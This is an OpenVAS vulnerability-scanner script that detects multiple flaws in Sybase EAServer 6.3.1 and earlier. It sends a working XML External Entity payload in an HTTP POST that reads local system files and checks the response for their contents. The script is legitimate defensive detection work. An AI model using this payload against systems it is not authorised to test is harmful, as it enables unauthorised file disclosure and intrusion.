###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sybase_easerver_61358.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# Sybase EAServer Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103752");
  script_bugtraq_id(61358);
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Sybase EAServer Multiple Security Vulnerabilities");


  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61358");
  script_xref(name:"URL", value:"http://www.sybase.com/products/modelingdevelopment/easerver");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-08-08 13:44:48 +0200 (Thu, 08 Aug 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Jetty_EAServer/banner");

  script_tag(name:"impact", value:"Successful exploits will allow attackers to download and upload
arbitrary files on the affected computer, obtain potentially sensitive
information and execute arbitrary commands with the privileges of the
user running the affected application.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP XML POST request and check the response.");
  script_tag(name:"insight", value:"1. A directory-traversal vulnerability
2. An XML External Entity injection
3. A command execution vulnerability");
  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Sybase EAServer is prone to multiple security vulnerabilities.");
  script_tag(name:"affected", value:"Sybase EAServer 6.3.1 and prior are vulnerable.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");

include("host_details.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if("Server: Jetty(EAServer/" >!< banner)exit(0);

host = get_host_name();
files = traversal_files();

foreach file(keys(files)) {

  xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [
     <!ELEMENT foo ANY >
     <!ENTITY xxe SYSTEM "file:///' + files[file]  + '">]>
  <openvas>
  <dt>
  <stringValue>&xxe;</stringValue>
  <booleanValue>0</booleanValue>
  </dt>
  </openvas>';

  len = strlen(xml);

  req = 'POST /rest/public/xml-1.0/testDataTypes HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: text/xml\r\n' +
        'Content-Length: ' + len  + '\r\n' +
        '\r\n' + xml;

  result = http_send_recv(port:port, data:req, bodyonly:TRUE);

  if("<testDataTypesResponse>" >!<result)continue;

  cont = split(result, sep:"<stringValue>", keep:FALSE);
  if(isnull(cont[1]))continue;

  if(ereg(pattern:file, string:cont[1])) {
    security_message(port:port);
    exit(0);
  }

}

exit(0);
